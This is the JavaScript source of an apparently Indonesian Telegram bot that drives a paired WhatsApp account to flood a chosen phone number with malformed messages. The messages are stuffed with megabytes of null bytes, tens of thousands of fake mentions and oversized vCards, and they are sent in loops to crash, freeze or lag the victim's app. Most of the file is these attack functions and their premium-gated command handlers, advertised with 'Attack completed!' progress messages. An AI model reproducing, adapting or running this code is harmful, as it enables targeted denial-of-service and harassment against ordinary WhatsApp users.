const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent,
    DisconnectReason,
    proto
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const moment = require('moment-timezone');
const { Telegraf } = require("telegraf");
const fs = require('fs');
const path = require('path');
const axios = require('axios'); 

// ========== KONFIGURASI ==========
const configFile = './config.json';
const loadConfig = () => {
    try { return JSON.parse(fs.readFileSync(configFile)); } 
    catch { return { globalPrem: false, cooldown: 10 }; }
};
const saveConfig = (data) => fs.writeFileSync(configFile, JSON.stringify(data, null, 2));

const cooldowns = new Map();
function isCooldown(userId, command, delay) {
    const now = Date.now();
    const key = `${userId}_${command}`;
    if (cooldowns.has(key)) {
        const expire = cooldowns.get(key);
        if (now < expire) return ((expire - now) / 1000).toFixed(1);
    }
    cooldowns.set(key, now + delay);
    return false;
}

// ========== OWNER & PREMIUM ==========
const ownerFile = 'owner.json';
const loadOwners = () => {
    try { return JSON.parse(fs.readFileSync(ownerFile)); } 
    catch { return { owners: [ownerID] }; }
};
const saveOwners = (data) => fs.writeFileSync(ownerFile, JSON.stringify(data, null, 2));
const isOwner = (id) => loadOwners().owners.includes(String(id));

const premiumFile = './premium.json';
const loadPremiumUsers = () => {
    try { return JSON.parse(fs.readFileSync(premiumFile)); } 
    catch { return {}; }
};
const savePremiumUsers = (users) => fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};
const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};
const isPremiumUser = (userId) => {
    const cf = loadConfig();
    if (cf.globalPrem) return true;
    const premiumUsers = loadPremiumUsers();
    if (!premiumUsers[userId]) return false;
    const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
    if (moment().isBefore(expiryDate)) return true;
    removePremiumUser(userId);
    return false;
};
const isModerator = (userId) => false;

// ========== TELEGRAM BOT ==========
const bot = new Telegraf(tokenBot);

// ========== WHATSAPP CLIENT ==========
let sock = null;
let isWhatsAppConnected = false;
let reconnectTimer = null;
let isManualDisconnect = false;
let reconnectAttempts = 0;
let pendingPhone = null;
let heartbeatInterval = null;
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function sendPresenceUpdate() {
    if (sock && isWhatsAppConnected) {
        try { await sock.sendPresenceUpdate('available'); } catch(e) {}
    }
}
function clearHeartbeat() { if (heartbeatInterval) { clearInterval(heartbeatInterval); heartbeatInterval = null; } }

const startSesi = async () => {
    if (reconnectTimer) clearTimeout(reconnectTimer);
    if (sock && !isManualDisconnect) { try { await sock.end(); } catch(e) {} sock = null; }
    if (isWhatsAppConnected) return;
    console.log(chalk.cyan('⟳ Menghubungkan WhatsApp...'));
    const { state, saveCreds } = await useMultiFileAuthState("./session");
    const { version } = await fetchLatestBaileysVersion();
    sock = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        auth: state,
        keepAliveIntervalMs: 30000,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000,
    });
    let pairingTriggered = false;
    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "connecting" && !pairingTriggered && pendingPhone && !sock.authState.creds.registered && !isManualDisconnect) {
            pairingTriggered = true;
            try {
                await sleep(3000);
                const code = await sock.requestPairingCode(pendingPhone);
                await bot.telegram.sendMessage(ownerID, `🔐 Pairing Code\nNomor: ${pendingPhone}\nKode: ${code}`);
                console.log(`Pairing code: ${code}`);
            } catch (err) { console.error(err); }
        }
        if (connection === "open") {
            isWhatsAppConnected = true;
            reconnectAttempts = 0;
            pairingTriggered = false;
            pendingPhone = null;
            isManualDisconnect = false;
            clearHeartbeat();
            heartbeatInterval = setInterval(() => sendPresenceUpdate(), 25000);
            console.log(chalk.green('✓ WhatsApp terhubung'));
            await bot.telegram.sendMessage(ownerID, '✓ WhatsApp terhubung');
        }
        if (connection === "close") {
            isWhatsAppConnected = false;
            clearHeartbeat();
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const isLoggedOut = statusCode === DisconnectReason.loggedOut;
            if (isLoggedOut || isManualDisconnect) return;
            reconnectAttempts++;
            const delay = Math.min(60000, 5000 * Math.pow(1.5, reconnectAttempts - 1));
            console.log(`Koneksi putus, reconnect dalam ${delay/1000}s (attempt ${reconnectAttempts})`);
            reconnectTimer = setTimeout(() => { if (!isWhatsAppConnected && !isManualDisconnect) startSesi(); }, delay);
        }
    });
    sock.ev.on("creds.update", saveCreds);
};

bot.command("connect", async (ctx) => {
    if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner.");
    const input = ctx.message.text.split(" ")[1];
    if (!input) return ctx.reply("Contoh: /connect 628123456789");
    let nomor = input.replace(/[^0-9]/g, "");
    if (!nomor.startsWith("628")) return ctx.reply("Nomor harus 628xxxx");
    pendingPhone = nomor;
    isManualDisconnect = true;
    if (sock) { try { await sock.end(); } catch(e) {} sock = null; }
    isWhatsAppConnected = false;
    if (reconnectTimer) clearTimeout(reconnectTimer);
    reconnectAttempts = 0;
    clearHeartbeat();
    const sessPath = './session';
    if (fs.existsSync(sessPath)) fs.rmSync(sessPath, { recursive: true, force: true });
    await ctx.reply(`Memulai pairing untuk ${nomor}... Kode akan dikirim ke owner.`);
    setTimeout(() => { isManualDisconnect = false; startSesi(); }, 2000);
});

if (!global._whatsappStarted) { global._whatsappStarted = true; setTimeout(startSesi, 3000); }

async function AMZDELAY(sock, target) {
  try {
    const delaymsg = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "tulongg",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(900000),
              version: 3
            }
          }
        }
      },
      contextInfo: {
        remoteJid: Math.random().toString(36) + "\u0000".repeat(100000),
        isForwarded: true,
        forwardingScore: 9999,
        statusAttributionType: 2,
        statusAttributions: Array.from({ length: 25000 }, (_, n) => ({
          participant: `62${n + 836598}@s.whatsapp.net`,
          type: 1
        }))
      }
    };

    await sock.relayMessage(target, delaymsg, {
      participant: { jid: target }
    });

    console.log(`✅ Sukses Sent To: ${target}`);

  } catch (err) {
    console.error(`❌ Error: ${err.message}`);
  }
}


//FUNCTION DELAY
async function CloverInvisibleV1(sock, target, payment = true) {
  const generateMentions = (count = 500) => {
    return [
      "0@s.whatsapp.net",
      ...Array.from({ length: count }, () =>
        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      )
    ];
  };

  let mentionList = generateMentions(50);
  let aksara = "ꦀ".repeat(3000) + "\n" + "ꦂ‎".repeat(3000);
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;

  if (11 > 9) {
    parse = parse ? false : true;
  }

  const X = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "X" + "ោ៝".repeat(10000),
    title: "XxX",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const DataMaklo = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ];
  let sequentialIndex = 0;
  console.log(chalk.red(`Sukses Send Bug ${target}`));
  const kontolLah = DataMaklo[sequentialIndex];
  sequentialIndex = (sequentialIndex + 1) % DataMaklo.length;

  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = kontolLah;

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }, {});
  await sock.relayMessage(
    target,
    { groupStatusMessageV2: { message: msg.message } },
    { messageId: msg.key.id }
  );
  let msgA = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " X ",
              mentions: Array.from(
                { length: 2000 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@.s.whatsapp.net"
              ),
              isForwarded: true,
              fromMe: false,
              forwardingScore: 9999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363422445860082@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            body: { text: "X", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );

  await sock.relayMessage(
    target,
    { groupStatusMessageV2: { message: msgA.message } },
    { messageId: msgA.key.id }
  );

  await new Promise(resolve => setTimeout(resolve, 3000));
}


//FUNCTION IPHONE 1
async function BigIosSuport(sock, target) {
  try {
    const Node = "𑇂𑆵𑆴𑆿";   
    let msg = generateWAMessageFromContent(
      target,
      {
        contactMessage: {
          displayName: "CLIENT_TARGET" + Node.repeat(10000),
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${Node.repeat(10000)};;;\nFN:${Node.repeat(10000)}\nNICKNAME:${"ᩫᩫ".repeat(4000)}\nORG:Sock_Support ⿻${"ᩫᩫ".repeat(4000)}\nTITLE:XH ⿻${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=628:+6278\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:NANO_METERS${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64:/9j/4AAQSkZJRgABAQAAAQABAAD/l\nX-WA-BIZ-NAME:🦠⃰͡ Xata${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
          contextInfo: {
            participant: target,
            externalAdReply: {
              automatedGreetingMessageShown: true,
              automatedGreetingMessageCtaType: "\u0000".repeat(100000),
              greetingMessageBody: "\u0000"
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(
      "status@broadcast",
      msg.message,
      {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      }
    );

    const metaNode = [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }];

    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + Node.repeat(15000),
      address: "\u0000" + Node.repeat(10000),
      url: `${Node.repeat(25000)}.com`
    };

    const extendMsg = {
      extendedTextMessage: {
        text: "X",
        matchedText: "",
        description: Node.repeat(25000),
        title: Node.repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/OLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 64,
        thumbnailWidth: 60,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    const makeMsg = content =>
      generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: content } },
        {}
      );

    const msg1 = makeMsg({ locationMessage });
    const msg2 = makeMsg(extendMsg);
    const msg3 = makeMsg({ locationMessage });

    for (const m of [msg1, msg2, msg3]) {
      await sock.relayMessage(
        "status@broadcast",
        m.message,
        {
          messageId: m.key.id,
          statusJidList: [target],
          additionalNodes: metaNode
        }
      );
    }

  } catch (e) {
    console.error(e);
  }
}
//FUNCTION BLANK 1
async function MentionedJid(sock, target) {
    const MentionedJidMsg = { viewOnceMessage: { message: { messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 }, interactiveMessage: { contextInfo: { stanzaId: sock.generateMessageTag(), participant: "0@s.whatsapp.net", quotedMessage: { documentMessage: { url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true", mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=", fileLength: "9999999999999", pageCount: 3567587327, mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=", fileName: "Gw Rizz Bang‌", fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=", directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0", mediaKeyTimestamp: "1735456100", contactVcard: true, caption: "", }, }, }, body: { text: " " + "ꦽ".repeat(100000) }, nativeFlowMessage: { buttons: [{ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), id: null }) }, { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), id: null }) }, { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), url: "https://" + "𑜦𑜠".repeat(10000) + ".com" }) }, { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), copy_code: "𑜦𑜠".repeat(10000) }) }, { name: "galaxy_message", buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "PAYMENT_PROMOTION", flow_message_version: "3" }) }] } } } } };
    await sock.relayMessage(target, MentionedJidMsg, { messageId: sock.generateMessageTag(), participant: { jid: target } });
    await sock.relayMessage("status@broadcast", MentionedJidMsg, { messageId: sock.generateMessageTag(), statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }] }] });
}
//FUNCTION BLANK 2
async function BlankMention(sock, target) {
    const MentionedJidMsg = { viewOnceMessage: { message: { messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 }, interactiveMessage: { contextInfo: { stanzaId: sock.generateMessageTag(), participant: "0@s.whatsapp.net", quotedMessage: { documentMessage: { url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true", mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=", fileLength: "9999999999999", pageCount: 3567587327, mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=", fileName: "Gw Rizz Bang‌", fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=", directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0", mediaKeyTimestamp: "1735456100", contactVcard: true, caption: "", }, }, }, body: { text: " " + "ꦽ".repeat(100000) }, nativeFlowMessage: { buttons: [{ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), id: null }) }, { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), id: null }) }, { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), url: "https://" + "𑜦𑜠".repeat(10000) + ".com" }) }, { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), copy_code: "𑜦𑜠".repeat(10000) }) }, { name: "galaxy_message", buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "PAYMENT_PROMOTION", flow_message_version: "3" }) }] } } } } };
    await sock.relayMessage(target, MentionedJidMsg, { messageId: sock.generateMessageTag(), participant: { jid: target } });
}
//FUNCTION DELAY HARD
async function LiteGetlles(sock, target) {
    console.log(chalk.blue(`Delay Invisible : ${target}`));
    await sock.relayMessage("status@broadcast", {
        interactiveResponseMessage: {
            body: { text: "NULL NULL NULL", format: "DEFAULT" },
            nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: "FORM_SCREEN", version: 3 },
            contextInfo: { remoteJid: Math.random().toString(36) + "CALL_ACCESS", isForwarded: true, forwardingScore: 999, urlTrackingMap: { urlTrackingMapElements: Array.from({ length: 280000 }, () => ({ "\u0000": "Grettles" })) } }
        }
    }, { statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: { status_setting: "contacts" }, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: [] }] }] }] });
}

// FUNCTION ATTACK YANG DIPERBAIKI


async function FunctionCrash(sock, target) {
    for (let i = 0; i < 30; i++) { 
        try { 
            await AMZDELAY(sock, target);
            await AMZDELAY(sock, target);  
                         } catch(e) { console.log(e.message); } 
        await sleep(1000 + Math.random() * 2000); 
    }
}

async function FunctionDelay(sock, target) {
    for (let i = 0; i < 30; i++) { 
        try { 
            await CloverInvisibleV1(sock, target);
            await CloverInvisibleV1(sock, target); 
        } catch(e) { console.log(e.message); } 
        await sleep(2000); 
    }
}

async function FunctionIphone(sock, target) {
    for (let i = 0; i < 30; i++) { 
        try { 
            await BigIosSuport(sock, target); 
        } catch(e) { console.log(e.message); } 
        await sleep(2000 + Math.random() * 2000); 
    }
}

async function FunctionBlank(sock, target) {
    for (let i = 0; i < 30; i++) { 
        try { 
            await BlankMention(sock, target);
            await MentionedJid(sock, target);
        } catch(e) { console.log(e.message); } 
        await sleep(2000 + Math.random() * 2000); 
    }
}

async function FunctionDelayHard(sock, target) {
    for (let i = 0; i < 10; i++) { 
        try { 
            await LiteGetlles(sock, target);
            await LiteGetlles(sock, target);       
        } catch(e) { console.log(e.message); } 
        await sleep(2000); 
    }
}

// ========== PROGRESS BAR ==========
function progressBar(percent, len = 8) {
    const filled = Math.round(percent / 100 * len);
    return "▓".repeat(filled) + "░".repeat(len - filled);
}
function makeCaption(target, percent, mode) {
    return `
┌─────────────────────
│ ${target}
│ ${mode} • ${percent}%
│ [${progressBar(percent)}]
└─────────────────────`;
}
function makeCaptionFinal(target, mode) {
    return `
┌─────────────────────
│ ${target}
│ ${mode} • 100%
│ [${progressBar(100)}]
└─────────────────────
✅ Attack completed!`;
}

// ========== COMMAND ATTACK ==========
const checkWA = (ctx, next) => {
    if (!isWhatsAppConnected || !sock) return ctx.reply("WhatsApp tidak terhubung. /connect");
    next();
};
const checkPrem = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) return ctx.reply("Akses premium hanya untuk member premium");
    next();
};
const checkLockCmd = (ctx, next) => {
    const cmd = ctx.message.text.split(" ")[0].replace("/", "");
    if (isCommandLocked(cmd)) return ctx.reply("🔒 Command ini sedang dikunci oleh owner.");
    next();
};

// LOCK SYSTEM
const lockedCommandsFile = './lockedCommands.json';
const loadLocked = () => { try { return JSON.parse(fs.readFileSync(lockedCommandsFile)); } catch { return { locked: [] }; } };
const saveLocked = (data) => fs.writeFileSync(lockedCommandsFile, JSON.stringify(data, null, 2));
const isCommandLocked = (cmd) => loadLocked().locked.includes(cmd);
const lockCommandFunc = (cmd) => { const data = loadLocked(); if (!data.locked.includes(cmd)) { data.locked.push(cmd); saveLocked(data); } };
const unlockCommandFunc = (cmd) => { const data = loadLocked(); data.locked = data.locked.filter(c => c !== cmd); saveLocked(data); };

async function runAttack(ctx, attackFunc, mode) {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`Contoh: /${ctx.message.text.split(" ")[0].replace("/","")} 628xxx`);
    const target = q.replace(/\D/g, '') + "@s.whatsapp.net";
    const photoUrlAttack = "https://files.catbox.moe/vowo9u.png";
    
    const msg = await ctx.replyWithPhoto(photoUrlAttack, { caption: makeCaption(q, 0, mode) });
    const mid = msg.message_id;
    
    (async () => {
        try {
            await attackFunc(sock, target);
            await ctx.telegram.editMessageCaption(ctx.chat.id, mid, null, makeCaptionFinal(q, mode)).catch(() => {});
        } catch (err) {
            console.error(`Attack error: ${err.message}`);
            await ctx.telegram.editMessageCaption(ctx.chat.id, mid, null, `❌ Attack gagal: ${err.message}`).catch(() => {});
        }
    })();
    
    for (let percent = 10; percent <= 100; percent += 10) {
        await sleep(80);
        await ctx.telegram.editMessageCaption(ctx.chat.id, mid, null, makeCaption(q, percent, mode)).catch(() => {});
    }
}

bot.command("xflower", checkWA, checkPrem, checkLockCmd, async (ctx) => runAttack(ctx, FunctionCrash, "Crash"));
bot.command("kilerXit", checkWA, checkPrem, checkLockCmd, async (ctx) => runAttack(ctx, FunctionDelay, "Delay"));
bot.command("powerXip", checkWA, checkPrem, checkLockCmd, async (ctx) => runAttack(ctx, FunctionIphone, "Xiphone"));
bot.command("znxOne", checkWA, checkPrem, checkLockCmd, async (ctx) => runAttack(ctx, FunctionBlank, "Blank"));
bot.command("ultraSQL", checkWA, checkPrem, checkLockCmd, async (ctx) => runAttack(ctx, FunctionDelayHard, "Hard"));

// ========== COMMAND OWNER ==========
bot.command('addowner', async (ctx) => {
    if (!isOwner(ctx.from.id)) return;
    const id = ctx.message.text.split(" ")[1];
    if (!id) return ctx.reply("Contoh: /addowner 123456789");
    let o = loadOwners();
    if (!o.owners.includes(id)) o.owners.push(id);
    saveOwners(o);
    ctx.reply(`✅ ${id} added as owner`);
});
bot.command('delowner', async (ctx) => {
    if (!isOwner(ctx.from.id)) return;
    const id = ctx.message.text.split(" ")[1];
    if (!id) return ctx.reply("Contoh: /delowner 123456789");
    let o = loadOwners();
    o.owners = o.owners.filter(x => x !== id);
    saveOwners(o);
    ctx.reply(`❌ ${id} removed from owner`);
});
bot.command('addprem', async (ctx) => {
    if (!isOwner(ctx.from.id)) return;
    const args = ctx.message.text.split(" ");
    if (args[1] === "on" || args[1] === "off") {
        let cf = loadConfig();
        cf.globalPrem = args[1] === "on";
        saveConfig(cf);
        return ctx.reply(`Global Premium ${args[1].toUpperCase()}`);
    }
    if (args.length < 3) return ctx.reply("Contoh: /addprem 123456789 30");
    const expiry = addPremiumUser(args[1], parseInt(args[2]));
    ctx.reply(`✅ ${args[1]} premium until ${expiry}`);
});
bot.command('delprem', async (ctx) => {
    if (!isOwner(ctx.from.id)) return;
    const id = ctx.message.text.split(" ")[1];
    if (!id) return ctx.reply("Contoh: /delprem 123456789");
    removePremiumUser(id);
    ctx.reply(`❌ ${id} removed from premium`);
});
bot.command('resetbot', async (ctx) => {
    if (!isOwner(ctx.from.id)) return;
    const sessPath = './session';
    if (fs.existsSync(sessPath)) fs.rmSync(sessPath, { recursive: true, force: true });
    ctx.reply("✅ Session reset. Bot will reconnect.");
    if (sock) await sock.end();
    isWhatsAppConnected = false;
    startSesi();
});
bot.command('setcd', (ctx) => {
    if (!isOwner(ctx.from.id)) return;
    const dt = parseInt(ctx.message.text.split(" ")[1]);
    if (isNaN(dt)) return ctx.reply("Contoh: /setcd 10");
    let cf = loadConfig();
    cf.cooldown = dt;
    saveConfig(cf);
    ctx.reply(`✅ Cooldown set to ${dt} seconds`);
});

// LOCK/UNLOCK COMMANDS
bot.command('lock', async (ctx) => {
    if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner.");
    const cmd = ctx.message.text.split(" ")[1];
    if (!cmd) return ctx.reply("Contoh: /lock xflower");
    lockCommandFunc(cmd);
    ctx.reply(`🔒 /${cmd} dikunci`);
});
bot.command('unlock', async (ctx) => {
    if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner.");
    const cmd = ctx.message.text.split(" ")[1];
    if (!cmd) return ctx.reply("Contoh: /unlock xflower");
    unlockCommandFunc(cmd);
    ctx.reply(`🔓 /${cmd} dibuka`);
});
bot.command('locklist', async (ctx) => {
    if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner.");
    const locked = loadLocked().locked;
    if (locked.length === 0) return ctx.reply("Tidak ada command terkunci");
    ctx.reply(`🔒 Terkunci: ${locked.map(c => `/${c}`).join(", ")}`);
});
bot.command('lockall', async (ctx) => {
    if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner.");
    const cmds = ["xflower","kilerXit","powerXip","znxOne","ultraSQL"];
    cmds.forEach(c => lockCommandFunc(c));
    ctx.reply("🔒 Semua command attack dikunci");
});
bot.command('unlockall', async (ctx) => {
    if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner.");
    const cmds = ["xflower","kilerXit","powerXip","znxOne","ultraSQL"];
    cmds.forEach(c => unlockCommandFunc(c));
    ctx.reply("🔓 Semua command attack dibuka");
});

// ========== MENU ==========
const photoUrlMenu = "https://picsur.org/i/c2750910-0627-4331-9575-a1c887560b9e.jpg";

bot.start(ctx => {
    const menuMessage = `\`\`\`JS
⟡ D I N A S T Y   E M P I R E  ⟡
───────────────────────────
  ( 𖤐𖤐𖤐 ) – ダィエンパイア・シーズン
     
   𖤐 【 Profile 】 𖤐 

𖤐 Creator : @ArdieDINASTY
𖤐 Version : 0.2.1 VIP
𖤐 User : ${ctx.from.first_name}
  
  𖤐 【 bot status 】 𖤐 

𖤐 Sender  : ${isWhatsAppConnected ? '✅ Active' : '❌ Inactive'}
𖤐 Premium : ${isPremiumUser(ctx.from.id) ? '🔥 Premium' : '❌ No Premium'}
───────────────────────────
\`\`\``;
    const keyboard = {
        inline_keyboard: [
            [{ text: "⚔️ DINASTY", callback_data: "menu_attack" }],
            [{ text: "⚙️ CONTROL", callback_data: "menu_controls" }],
            [{ text: "🌐 INFORMATION", url: "https://t.me/ardievht404" }]
        ]
    };
    ctx.replyWithPhoto(photoUrlMenu, { caption: menuMessage, parse_mode: "Markdown", reply_markup: keyboard });
});

bot.action("menu_attack", async (ctx) => {
    const menuMessage = `\`\`\`Js
⟡ D I N A S T Y   E M P I R E  ⟡
───────────────────────────
  ( 𖤐𖤐𖤐 ) – ダィエンパイア・シーズン
     
